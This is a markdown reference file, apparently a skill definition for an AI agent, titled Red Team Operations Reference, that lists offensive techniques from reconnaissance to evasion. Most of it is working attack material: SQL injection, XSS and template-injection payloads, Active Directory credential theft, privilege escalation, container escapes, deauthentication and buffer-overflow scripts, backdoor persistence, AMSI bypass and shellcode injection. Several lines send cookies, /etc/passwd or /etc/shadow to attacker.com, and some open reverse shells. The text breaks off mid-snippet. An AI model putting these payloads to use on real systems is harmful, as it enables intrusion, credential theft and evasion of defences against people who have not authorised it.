---
name: redteam
description: "Offensive security, red team operations, exploit development, penetration testing, CTF techniques, and security research. Comprehensive reference for authorized security testing."
domain: security
version: "2.0"
updated: "2026-02-18"
---

# Red Team Operations Reference

Authorized penetration testing and security research reference. All techniques require proper authorization.

## Reconnaissance

### Passive Recon

| Tool | Command | Purpose |
|------|---------|---------|
| whois | `whois domain.com` | Domain registration, nameservers, contacts |
| dig | `dig ANY domain.com` | All DNS record types |
| subfinder | `subfinder -d domain.com -silent` | Subdomain enumeration |
| amass | `amass enum -passive -d domain.com` | OSINT subdomain discovery |
| theHarvester | `theHarvester -d domain.com -b all` | Emails, hosts, IPs |
| shodan | `shodan search hostname:target.com` | Internet-facing services |
| waybackurls | `echo domain.com \| waybackurls` | Historical URL discovery |
| crt.sh | `curl "https://crt.sh/?q=%25.domain.com&output=json"` | Certificate transparency |
| github-dorking | `site:github.com "domain.com" password\|secret\|key` | Leaked credentials in repos |

### Active Recon

```bash
# Full TCP + UDP scan with service detection
nmap -sS -sU -sV -sC -O -T4 -p- --min-rate 1000 <target> -oA scan_full

# Web directory bruteforce
feroxbuster -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
  -x php,asp,aspx,jsp,html,js,json -t 50

# Parameter discovery
arjun -u http://<target>/endpoint

# Virtual host enumeration
ffuf -u http://<target> -H "Host: FUZZ.domain.com" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs <default-size>

# Technology fingerprinting
whatweb http://<target> -v
wappalyzer-cli http://<target>

# Nuclei vulnerability scanning
nuclei -u http://<target> -t nuclei-templates/ -severity critical,high -c 50

# Port knock detection
for port in 7000 8000 9000; do
  nmap -Pn --host-timeout 100 --max-retries 0 -p $port <target>
done
```

### DNS Enumeration

```bash
# Zone transfer attempt
dig axfr @ns1.domain.com domain.com

# DNS bruteforce
dnsx -d domain.com -w subdomains.txt -resp -a -aaaa -cname -mx -ns

# Reverse DNS sweep
for ip in $(seq 1 254); do dig -x 10.10.10.$ip +short; done

# DNSSEC walk (zone enumeration via NSEC records)
ldns-walk @ns.domain.com domain.com
```

## Web Exploitation

### SQL Injection

```sql
-- Authentication bypass
' OR 1=1--
admin'--
' OR '1'='1' /*

-- UNION-based extraction
' UNION SELECT 1,2,3,group_concat(table_name) FROM information_schema.tables--
' UNION SELECT 1,username,password,4 FROM users--
' UNION SELECT 1,load_file('/etc/passwd'),3,4--

-- Blind boolean-based
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--

-- Blind time-based
' AND IF(1=1,SLEEP(5),0)--
'; WAITFOR DELAY '0:0:5'--

-- Error-based extraction (MySQL)
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--

-- Stacked queries
'; DROP TABLE users;--
'; EXEC xp_cmdshell('whoami');--

-- Second-order injection (stored in DB, triggered later)
-- Register with username: admin'--
-- Then trigger via password reset or profile display

-- WAF bypass techniques
/*!50000UNION*/ /*!50000SELECT*/ 1,2,3
UnIoN SeLeCt 1,2,3
%55nion %53elect 1,2,3
```

Automated tools for SQL injection testing:

```bash
# SQLMap with level 5 and risk 3 for thorough testing
sqlmap -u "http://target/page?id=1" --dbs --batch --random-agent
sqlmap -r request.txt --level 5 --risk 3 --tamper=space2comment,between
sqlmap -u "http://target/api" --method=POST --data='{"id":1}' --dbms=postgresql

# NoSQL injection testing (MongoDB)
# In JSON body: {"username":{"$gt":""},"password":{"$gt":""}}
# In URL: ?username[$ne]=invalid&password[$gt]=
```

### XSS Payloads

```html
<!-- Reflected XSS -->
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
"><script>alert(1)</script>
<details open ontoggle=alert(1)>
<body onload=alert(1)>

<!-- DOM-based XSS -->
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
javascript:alert(1)//

<!-- Stored XSS with cookie theft -->
<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
<script>new Image().src='https://attacker.com/log?c='+document.cookie</script>

<!-- CSP bypass techniques -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app ng-csp><p>{{$eval.constructor('alert(1)')()}}</p></div>

<!-- Filter evasion -->
<scr<script>ipt>alert(1)</scr</script>ipt>
<ScRiPt>alert(1)</ScRiPt>
\u003cscript\u003ealert(1)\u003c/script\u003e
<iframe srcdoc="<script>alert(1)</script>">

<!-- Mutation XSS (mXSS) -->
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
```

### SSRF Targets

```
# AWS metadata
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/dynamic/instance-identity/document

# GCP metadata
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure metadata
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Internal services
http://127.0.0.1:6379/  # Redis
http://127.0.0.1:11211/ # Memcached
http://127.0.0.1:9200/  # Elasticsearch

# Protocol smuggling
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall
dict://127.0.0.1:6379/info

# IP obfuscation (bypass filters)
http://[::1]:80
http://0x7f000001
http://0177.0.0.1
http://2130706433
http://127.1
```

### SSTI Detection and Exploitation

```
# Detection polyglot
${7*7}
{{7*7}}
#{7*7}
<%= 7*7 %>
${T(java.lang.Runtime).getRuntime().exec('id')}
```

Template-specific payloads:

```python
# Jinja2 RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[407]('id',shell=True,stdout=-1).communicate()}}
{{request.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}

# Mako
${__import__('os').popen('id').read()}

# Tornado
{% import os %}{{ os.popen('id').read() }}
```

```java
// FreeMarker
<#assign cmd="freemarker.template.utility.Execute"?new()>${cmd("id")}

// Velocity
#set($cmd='id')#set($rt=$x.class.forName('java.lang.Runtime'))#set($obj=$rt.getMethod('getRuntime').invoke($null))$obj.exec($cmd)

// Thymeleaf
[[${T(java.lang.Runtime).getRuntime().exec('id')}]]
```

### Prototype Pollution (Node.js)

```json
{"__proto__":{"polluted":true}}
{"constructor":{"prototype":{"polluted":true}}}
```

```javascript
// Detection
const obj = JSON.parse('{"__proto__":{"polluted":"yes"}}');
console.log({}.polluted); // "yes" if vulnerable

// RCE via child_process (Express/EJS)
// Pollute: {"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id');s"}}
// Then trigger template render

// RCE via env override
// Pollute: {"__proto__":{"shell":"node","NODE_OPTIONS":"--require /proc/self/environ"}}
```

### Deserialization Attacks

```bash
# Java (ysoserial)
java -jar ysoserial.jar CommonsCollections1 'id' | base64

# .NET (ysoserial.net)
ysoserial.exe -g WindowsIdentity -f Json.Net -c "calc.exe"

# PHP
O:8:"autoload":1:{s:4:"file";s:11:"/etc/passwd";}

# Python pickle
import pickle, base64, os
class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))
print(base64.b64encode(pickle.dumps(Exploit())))
```

### JWT Attacks

```bash
# None algorithm attack
# Header: {"alg":"none","typ":"JWT"}
# Payload: {"sub":"admin","iat":1234567890}
# Signature: (empty)

# HMAC/RSA confusion (alg:HS256 with RSA public key as secret)
python3 -c "
import jwt, json
pub_key = open('public.pem').read()
token = jwt.encode({'sub':'admin','iat':1234567890}, pub_key, algorithm='HS256')
print(token)
"

# Brute force weak secrets
hashcat -m 16500 jwt.txt rockyou.txt
john jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256

# JWK header injection
# Header: {"alg":"RS256","jwk":{"kty":"RSA","n":"...","e":"AQAB"}}
# Sign with your own key pair

# kid injection
# Header: {"alg":"HS256","kid":"../../etc/passwd"}
# Secret = contents of /etc/passwd
```

### Command Injection

```bash
# Basic separators
; id
| id
|| id
& id
&& id
$(id)
`id`

# Newline injection
%0a id
%0d%0a id

# Filter bypass
c\at /et\c/pas\swd
cat${IFS}/etc/passwd
{cat,/etc/passwd}
X=$'cat\x20/etc/passwd'&&$X
```

### File Inclusion

```
# Local File Inclusion
../../etc/passwd
....//....//etc/passwd
..%252f..%252f..%252fetc/passwd
php://filter/convert.base64-encode/resource=config.php
php://input (POST body = PHP code)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+

# Remote File Inclusion
http://attacker.com/shell.txt
https://attacker.com/shell.php
```

### XXE Injection

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- Blind XXE with OOB exfiltration -->
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>

<!-- evil.dtd -->
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;
```

## Active Directory Attacks

### Enumeration

```powershell
# Domain info
Get-ADDomain
Get-ADForest
Get-ADTrust -Filter *

# Users and groups
Get-ADUser -Filter * -Properties * | Select-Object Name,SamAccountName,Description,MemberOf
Get-ADGroupMember "Domain Admins" -Recursive
Get-ADComputer -Filter * -Properties * | Select-Object Name,OperatingSystem,IPv4Address

# BloodHound collection
SharpHound.exe -c All --zipfilename bloodhound.zip
bloodhound-python -u user -p 'pass' -d domain.local -ns 10.10.10.1 -c all

# LDAP queries
ldapsearch -H ldap://dc.domain.local -x -b "DC=domain,DC=local" "(objectClass=user)"
```

### Kerberos Attacks

```bash
# AS-REP Roasting (no pre-auth required)
GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.hash
hashcat -m 18200 asrep.hash rockyou.txt

# Kerberoasting (extract TGS for offline cracking)
GetUserSPNs.py domain.local/user:password -request -outputfile kerberoast.hash
hashcat -m 13100 kerberoast.hash rockyou.txt

# Golden Ticket (requires krbtgt hash)
ticketer.py -nthash <krbtgt_hash> -domain-sid <SID> -domain domain.local administrator
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass domain.local/administrator@dc.domain.local

# Silver Ticket (service-specific, requires service account hash)
ticketer.py -nthash <svc_hash> -domain-sid <SID> -domain domain.local -spn CIFS/target.domain.local user

# Delegation attacks
# Unconstrained delegation: compromise server -> extract TGT from memory
# Constrained delegation: S4U2Self + S4U2Proxy
getST.py -spn CIFS/target.domain.local -impersonate administrator domain.local/svc_account:password

# Pass the Ticket
export KRB5CCNAME=/tmp/ticket.ccache
smbclient.py -k -no-pass domain.local/administrator@target
```

### Credential Harvesting

```bash
# NTLM relay (no signing)
ntlmrelayx.py -t ldap://dc.domain.local --delegate-access
ntlmrelayx.py -t smb://target -smb2support

# Responder (LLMNR/NBT-NS/mDNS poisoning)
responder -I eth0 -wrf

# Mimikatz
sekurlsa::logonpasswords
lsadump::dcsync /domain:domain.local /user:krbtgt
lsadump::sam
vault::cred

# DCSync (Domain Controller replication)
secretsdump.py domain.local/admin:password@dc.domain.local

# LAPS password extraction
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Select-Object Name,ms-Mcs-AdmPwd
```

### Lateral Movement

```bash
# Impacket suite
psexec.py -hashes :NTLM_HASH domain/admin@target
wmiexec.py -hashes :NTLM_HASH domain/admin@target
smbexec.py -hashes :NTLM_HASH domain/admin@target
atexec.py -hashes :NTLM_HASH domain/admin@target 'whoami'
dcomexec.py -hashes :NTLM_HASH domain/admin@target

# WinRM
evil-winrm -i target -u admin -H NTLM_HASH

# RDP
xfreerdp /v:target /u:admin /pth:NTLM_HASH

# SMB file operations
smbclient.py domain/admin:password@target
```

### AD Persistence

```powershell
# Skeleton Key (inject into LSASS on DC - password "mimikatz" works for all)
misc::skeleton

# AdminSDHolder (propagates ACL to protected groups every 60 min)
Add-DomainObjectAcl -TargetIdentity AdminSDHolder -PrincipalIdentity attacker -Rights All

# DCShadow (register rogue DC to push changes)
lsadump::dcshadow /object:targetUser /attribute:SIDHistory /value:<admin-SID>

# GPO abuse
New-GPO -Name "Backdoor" | New-GPLink -Target "OU=Servers,DC=domain,DC=local"
```

## Privilege Escalation

### Linux Privilege Escalation

```bash
# Automated enumeration
linpeas.sh
linux-exploit-suggester.sh
pspy64  # Monitor processes without root

# SUID/SGID binaries
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# GTFOBins exploitation (common SUID)
# find: find . -exec /bin/sh -p \;
# vim: vim -c ':!/bin/sh'
# python: python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# nmap (old): nmap --interactive -> !sh
# cp: cp /bin/bash /tmp/bash; chmod +s /tmp/bash; /tmp/bash -p

# Capabilities
getcap -r / 2>/dev/null
# cap_setuid: python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# cap_dac_read_search: tar cf /dev/null /etc/shadow --checkpoint=1 --checkpoint-action=exec=/bin/sh

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
# Writable cron scripts = instant root

# PATH injection (if cron/SUID calls binary without full path)
echo '/bin/bash -p' > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH

# Writable /etc/passwd
openssl passwd -1 newpass
echo 'root2:$1$hash:0:0::/root:/bin/bash' >> /etc/passwd

# Kernel exploits
uname -r  # Check version
# DirtyPipe (5.8 <= kernel < 5.16.11): CVE-2022-0847
# DirtyCow (2.6.22 <= kernel < 4.8.3): CVE-2016-5195
# PwnKit (all polkit versions): CVE-2021-4034

# sudo misconfigurations
sudo -l
# (ALL) NOPASSWD: /usr/bin/env -> sudo env /bin/sh
# (ALL) NOPASSWD: /usr/bin/find -> sudo find / -exec /bin/sh \;
# LD_PRELOAD exploit (if env_keep+=LD_PRELOAD in sudoers)

# Docker group (if user is in docker group)
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# NFS root squash bypass (no_root_squash)
mount -t nfs target:/share /mnt
cp /bin/bash /mnt/bash && chmod +s /mnt/bash
# Execute /mnt/bash -p on target
```

### Windows Privilege Escalation

```powershell
# Automated enumeration
winPEAS.exe
Seatbelt.exe -group=all
SharpUp.exe

# Service misconfigurations
# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows"
# Weak service permissions
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
sc qc <service>
# Writable service binary
icacls "C:\Program Files\Service\binary.exe"

# Always Install Elevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# If both = 1: msiexec /quiet /qn /i malicious.msi

# Token impersonation (SeImpersonatePrivilege)
# PrintSpoofer, GodPotato, JuicyPotato, RoguePotato, SweetPotato
PrintSpoofer64.exe -i -c "cmd /c whoami"
GodPotato.exe -cmd "cmd /c whoami"

# SeBackupPrivilege (backup SAM/SYSTEM)
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
secretsdump.py -sam sam.hive -system system.hive LOCAL

# DLL hijacking
# Find missing DLLs: Process Monitor filter -> Result=NAME NOT FOUND, Path ends with .dll
# Place malicious DLL in writable directory that's searched before system dirs

# Scheduled tasks
schtasks /query /fo LIST /v
# Writable task binary = code execution as task owner

# Registry autoruns
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
# Writable autorun binary = persistence + potential privesc
```

## Cloud Security

### AWS Exploitation

```bash
# Enumerate caller identity
aws sts get-caller-identity

# S3 bucket enumeration and exploitation
aws s3 ls s3://bucket-name --no-sign-request
aws s3 cp s3://bucket-name/sensitive-file.txt . --no-sign-request

# IAM enumeration
aws iam list-users
aws iam list-roles
aws iam list-attached-user-policies --user-name target
aws iam get-policy-version --policy-arn <arn> --version-id v1

# EC2 metadata from SSRF (IMDSv1)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/user-data

# Lambda function extraction
aws lambda list-functions
aws lambda get-function --function-name <name>  # Includes download URL

# Secrets Manager
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id <id>

# Pacu (AWS exploitation framework)
pacu --new-session test
run iam__enum_permissions
run iam__privesc_scan
run ec2__enum
```

### Azure Exploitation

```bash
# Azure CLI enumeration
az account list
az ad user list
az ad group list
az role assignment list --all

# Storage account enumeration
az storage account list
az storage container list --account-name <name>
az storage blob list --container-name <container> --account-name <name>

# Managed Identity token theft (from compromised VM)
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# ROADtools (Azure AD enumeration)
roadrecon auth -u user@domain.com -p password
roadrecon gather
roadrecon gui

# Azure AD password spray
MSOLSpray.py -u users.txt -p 'Password123' -t domain.onmicrosoft.com
```

### GCP Exploitation

```bash
# Service account enumeration
gcloud iam service-accounts list
gcloud projects get-iam-policy <project>

# Metadata from SSRF
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys

# Storage bucket enumeration
gsutil ls gs://bucket-name
gsutil cp gs://bucket-name/file .

# Compute instance enumeration
gcloud compute instances list
gcloud compute instances describe <instance> --zone <zone>
```

## Container Security

### Docker Escape

```bash
# Check if inside container
cat /proc/1/cgroup | grep -i docker
ls -la /.dockerenv

# Privileged container escape
# Method 1: Mount host filesystem
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host bash

# Method 2: cgroup escape (CVE-2022-0492)
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
echo "#!/bin/sh" > /cmd
echo "cat /etc/shadow > /tmp/cgrp/output" >> /cmd
chmod +x /cmd
echo "/cmd" > /tmp/cgrp/release_agent
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Method 3: Docker socket mounted
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh

# Method 4: nsenter (if you have CAP_SYS_ADMIN)
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash

# Method 5: Release agent abuse
# Works when: privileged=true OR sys_admin capability
```

### Kubernetes Attacks

```bash
# Enumerate from inside pod
kubectl auth can-i --list
kubectl get secrets --all-namespaces
kubectl get pods --all-namespaces
env | grep -i kube

# Service account token (auto-mounted)
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

# API server access from pod
APISERVER=https://kubernetes.default.svc
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -s $APISERVER/api/v1/namespaces/default/secrets -H "Authorization: Bearer $TOKEN" -k

# Kubeletctl (direct kubelet API)
kubeletctl scan rce --cidr 10.0.0.0/24
kubeletctl exec "id" -p <pod> -c <container> -s <node>

# Escape via hostPath mount
# If pod spec allows hostPath: mount host / into container
```

## Network Attacks

### Man-in-the-Middle

```python
from scapy.all import *

# ARP spoofing
def arp_spoof(target_ip, gateway_ip, iface):
    target_mac = getmacbyip(target_ip)
    send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip),
         iface=iface, verbose=False)
    send(ARP(op=2, pdst=gateway_ip, hwdst=getmacbyip(gateway_ip), psrc=target_ip),
         iface=iface, verbose=False)

# DNS spoofing
def dns_spoof(pkt, spoofed_ip):
    if pkt.haslayer(DNSQR):
        resp = (IP(dst=pkt[IP].src, src=pkt[IP].dst) /
                UDP(dport=pkt[UDP].sport, sport=53) /
                DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                    an=DNSRR(rrname=pkt[DNSQR].qname, rdata=spoofed_ip)))
        send(resp, verbose=False)
```

```bash
# Bettercap MITM
bettercap -T <target> -X --proxy --proxy-https

# SSH MITM
ssh-mitm server --remote-host target.com

# HTTPS interception (mitmproxy)
mitmproxy --mode transparent --showhost
```

### WiFi Attacks

```python
#!/usr/bin/env python3
from scapy.all import *
import argparse

def scan_networks(iface):
    """Passive beacon frame capture for network enumeration."""
    def handler(pkt):
        if pkt.haslayer(Dot11Beacon):
            ssid = pkt[Dot11Elt].info.decode(errors='ignore')
            bssid = pkt[Dot11].addr2
            stats = pkt[Dot11Beacon].network_stats()
            channel = stats.get('channel', '?')
            crypto = stats.get('crypto', set())
            print(f"[+] {bssid} | Ch:{channel} | {','.join(crypto)} | {ssid}")
    sniff(iface=iface, prn=handler, timeout=30)

def deauth(iface, target, gateway, count=100):
    """802.11 deauthentication attack for handshake capture."""
    pkt = (RadioTap() /
           Dot11(addr1=target, addr2=gateway, addr3=gateway) /
           Dot11Deauth(reason=7))
    sendp(pkt, iface=iface, count=count, inter=0.05, verbose=False)
    print(f"[+] Sent {count} deauth: {target} <-> {gateway}")

def capture_handshake(iface, bssid, output="capture.pcap", timeout=60):
    """Capture WPA 4-way handshake for offline cracking."""
    pkts = sniff(iface=iface, filter=f"ether host {bssid}", timeout=timeout)
    wrpcap(output, pkts)
    eapol = [p for p in pkts if p.haslayer(EAPOL)]
    print(f"[+] {len(pkts)} packets, {len(eapol)} EAPOL -> {output}")

if __name__ == '__main__':
    p = argparse.ArgumentParser()
    p.add_argument('action', choices=['scan', 'deauth', 'capture'])
    p.add_argument('-i', '--iface', required=True)
    p.add_argument('-t', '--target')
    p.add_argument('-g', '--gateway')
    p.add_argument('-b', '--bssid')
    p.add_argument('-c', '--count', type=int, default=100)
    p.add_argument('-o', '--output', default='capture.pcap')
    args = p.parse_args()
    actions = {
        'scan': lambda: scan_networks(args.iface),
        'deauth': lambda: deauth(args.iface, args.target, args.gateway, args.count),
        'capture': lambda: capture_handshake(args.iface, args.bssid, args.output)
    }
    actions[args.action]()
```

```bash
# WPA/WPA2 cracking
aircrack-ng -w rockyou.txt capture.pcap
hashcat -m 22000 capture.hc22000 rockyou.txt

# WPS attacks
wash -i wlan0mon
reaver -i wlan0mon -b <bssid> -vv
bully -b <bssid> -c <channel> wlan0mon

# Evil twin with hostapd
hostapd-mana evil.conf
# evil.conf: interface=wlan0, ssid=FreeWiFi, channel=6
# Pair with DHCP server + captive portal
```

## Binary Exploitation

### Buffer Overflow

```python
from pwn import *

# Setup
context.binary = elf = ELF('./vuln')
context.log_level = 'info'

# Find offset
# cyclic(200) -> crash -> cyclic_find(fault_addr)
offset = 72

# Ret2libc
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rop = ROP(elf)
rop.call('puts', [elf.got['puts']])
rop.call(elf.symbols['main'])

p = process('./vuln')
p.sendline(flat(b'A' * offset, rop.chain()))

leaked = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leaked - libc.symbols['puts']
log.success(f"libc base: {hex(libc.address)}")

rop2 = ROP(libc)
rop2.call('system', [next(libc.search(b'/bin/sh\x00'))])
p.sendline(flat(b'A' * offset, rop2.chain()))
p.interactive()
```

### Format String

```python
from pwn import *

# Read from stack
# %p.%p.%p.%p... to leak values
# %7$s to read string at 7th argument position

# Write arbitrary value (write4 primitive)
# %<value>c%<offset>$n writes <value> to address at <offset>

# GOT overwrite via format string
elf = ELF('./vuln')
target = elf.got['exit']  # Overwrite exit@GOT
payload = fmtstr_payload(offset=6, writes={target: elf.symbols['win']})
```

### Heap Exploitation

```c
// Use-After-Free pattern
// 1. Allocate chunk A (contains function pointer)
// 2. Free chunk A
// 3. Allocate chunk B (same size as A, gets A's memory)
// 4. Write to B (overwrites A's function pointer)
// 5. Call function via A (calls attacker-controlled address)

// tcache poisoning (glibc 2.26+)
// 1. Allocate two chunks same size
// 2. Free both (go to tcache bin)
// 3. Overwrite freed chunk's fd pointer
// 4. malloc returns attacker-controlled address
// 5. Write to achieve arbitrary write

// House of Force (old glibc, < 2.29)
// Overwrite top chunk size to -1
// Calculate distance to target
// malloc(distance) -> next malloc returns target address
```

### Shellcode

```python
# Common shellcodes (x86-64 Linux)
from pwn import *
context.arch = 'amd64'

# execve("/bin/sh", NULL, NULL)
shellcode = asm(shellcraft.sh())

# Reverse shell
shellcode = asm(shellcraft.connect('10.10.10.10', 4444) + shellcraft.dupsh())

# Read /etc/passwd
shellcode = asm(shellcraft.cat('/etc/passwd'))

# Msfvenom alternatives
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f python -b '\x00'
```

## Post-Exploitation

### Persistence

```bash
# Linux persistence
# Cron
(crontab -l; echo "* * * * * /tmp/.backdoor") | crontab -
echo "* * * * * root /tmp/.backdoor" >> /etc/crontab

# SSH keys
echo "ssh-rsa AAAA...key attacker" >> ~/.ssh/authorized_keys
echo "ssh-rsa AAAA...key attacker" >> /root/.ssh/authorized_keys

# Systemd service
cat > /etc/systemd/system/backdoor.service << 'UNIT'
[Unit]
Description=System Service
[Service]
ExecStart=/tmp/.backdoor
Restart=always
[Install]
WantedBy=multi-user.target
UNIT
systemctl enable backdoor

# bashrc/profile
echo '/tmp/.backdoor &' >> ~/.bashrc

# LD_PRELOAD
echo '/tmp/evil.so' >> /etc/ld.so.preload

# PAM backdoor
# Modify pam_unix.so to accept magic password
```

```powershell
# Windows persistence
# Registry Run keys
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\backdoor.exe"

# Scheduled task
schtasks /create /tn "WindowsUpdate" /tr "C:\backdoor.exe" /sc onlogon /ru SYSTEM

# WMI event subscription (fileless)
$Filter = Set-WmiInstance -Namespace "root\subscription" -Class "__EventFilter" -Arguments @{
    Name = "Backdoor"; EventNameSpace = "root\cimv2";
    QueryLanguage = "WQL"; Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$Consumer = Set-WmiInstance -Namespace "root\subscription" -Class "CommandLineEventConsumer" -Arguments @{
    Name = "Backdoor"; CommandLineTemplate = "C:\backdoor.exe"
}
Set-WmiInstance -Namespace "root\subscription" -Class "__FilterToConsumerBinding" -Arguments @{
    Filter = $Filter; Consumer = $Consumer
}

# COM object hijacking
# Golden image / startup folder / DLL search order hijacking
```

### Data Exfiltration

```bash
# DNS exfiltration
cat /etc/passwd | xxd -p | fold -w 60 | while read l; do dig $l.exfil.attacker.com; done

# ICMP exfiltration
xxd -p /etc/passwd | while read -n 32 chunk; do
  ping -c 1 -p "$chunk" attacker.com
done

# HTTPS exfiltration
curl -X POST https://attacker.com/exfil -d @/etc/shadow

# Steganography
steghide embed -cf image.jpg -ef secret.txt -p password
steghide extract -sf image.jpg -p password
```

### Pivoting and Tunneling

```bash
# SSH tunneling
ssh -L 8080:internal:80 pivot@host       # Local port forward
ssh -R 8080:localhost:80 pivot@host       # Remote port forward
ssh -D 1080 pivot@host                    # SOCKS proxy

# Chisel (compiled Go binary, no deps)
# Server (on attacker): chisel server -p 8000 --reverse
# Client (on target):   chisel client attacker:8000 R:socks

# Ligolo-ng (modern tunneling)
# Proxy (attacker):  ligolo-proxy -selfcert
# Agent (target):    ligolo-agent -connect attacker:11601 -retry

# Proxychains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf
proxychains nmap -sT -Pn internal_target

# socat port forward
socat TCP-LISTEN:8080,fork TCP:internal:80
```

## Evasion Techniques

### Windows Evasion

```powershell
# AMSI bypass (runtime patching)
$a=[Ref].Assembly.GetTypes()| ForEach-Object {if ($_.Name -like "*iUtils") {$_}}
$b=$a.GetFields('NonPublic,Static')| ForEach-Object {if ($_.Name -like "*Context") {$_}}
$b.SetValue($null,[IntPtr]::Zero)

# ETW patching (disable event tracing)
$patch = [byte[]]@(0xC3)  # ret instruction
$ntdll = [System.Runtime.InteropServices.Marshal]::GetHINSTANCE(
    [System.Reflection.Assembly]::LoadWithPartialName('System.Core').GetModules()[0])
```

```c
// Process hollowing
// 1. CreateProcess(legitimate.exe, CREATE_SUSPENDED)
// 2. NtUnmapViewOfSection(hProcess, imageBase)
// 3. VirtualAllocEx(hProcess, imageBase, size, MEM_COMMIT|MEM_RESERVE)
// 4. WriteProcessMemory(hProcess, imageBase, malicious_pe, size)
// 5. SetThreadContext(hThread, &ctx)  // Update entry point
// 6. ResumeThread(hThread)

// Shellcode injection
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
LPVOID addr = VirtualAllocEx(hProcess, NULL, shellcode_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProcess, addr, shellcode, shellcode_size, NULL);
CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);

// Direct syscalls (bypass EDR hooks on ntdll)
// Use SysWhispers3 to generate syscall stubs
// Avoids userland hooks by calling kernel directly
// NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx

// Unhooking ntdll (restore clean copy from disk)
// 1. Map fresh ntdll.dll from disk (KnownDlls or System32)
// 2. Find .text section in both copies
// 3. VirtualProtect(RWX) on hooked .text
// 4. memcpy clean .text over hooked .text
// 5. VirtualProtect(RX) to restore

// PPID spoofing
STARTUPINFOEXA si = {0};
si.StartupInfo.cb = sizeof(si);
SIZE_T size = 0;
InitializeProcThreadAttributeList(NULL, 1, 0, &size);
si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(size);
